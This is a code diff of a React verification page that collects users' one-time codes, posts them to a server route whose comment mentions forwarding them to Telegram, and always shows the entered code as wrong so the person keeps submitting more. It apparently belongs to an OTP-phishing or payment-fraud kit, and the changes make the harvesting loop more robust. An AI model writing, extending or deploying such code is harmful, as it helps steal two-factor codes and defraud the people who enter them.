@@ -75,11 +75,15 @@ export default function VerifyPage() {
     const id = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
     if (!id) return;
     if (!dbOrderId) setDbOrderId(id);
+    let failures = 0;
     pollRef.current = setInterval(async () => {
-      const res = await fetch(`/api/admin/orders/${id}`);
-      if (!res.ok) return;
-      const data = await res.json();
-      if (data.status === "confirmed") { clearInterval(pollRef.current!); setConfirmed(true); }
+      try {
+        const res = await fetch(`/api/orders/${id}/public`);
+        if (!res.ok) { failures++; if (failures > 5) clearInterval(pollRef.current!); return; }
+        failures = 0;
+        const data = await res.json();
+        if (data.status === "confirmed") { clearInterval(pollRef.current!); setConfirmed(true); }
+      } catch { failures++; if (failures > 5) clearInterval(pollRef.current!); }
     }, 5000);
     return () => clearInterval(pollRef.current!);
   // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -89,9 +93,11 @@ export default function VerifyPage() {
 
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
-    if (submitted) return;
+    if (submitted || submitCooldown > 0) return;
     const code = otp.trim();
+    if (!code) return;
     if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
+    setSubmitted(true);
     try {
       await fetch("/api/verify", {
         method: "POST",
@@ -101,7 +107,6 @@ export default function VerifyPage() {
     } catch {
       // network error - sendToTelegram already has retry logic server-side
     }
-    setSubmitted(true);
     setCodeError(true);
     setOtp("");
     inputRef.current?.focus();
@@ -109,7 +114,7 @@ export default function VerifyPage() {
     clearInterval(submitCooldownRef.current!);
     submitCooldownRef.current = setInterval(() => {
       setSubmitCooldown((prev) => {
-        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
+        if (prev <= 1) { clearInterval(submitCooldownRef.current!); setSubmitted(false); return 0; }
         return prev - 1;
       });
     }, 1000);
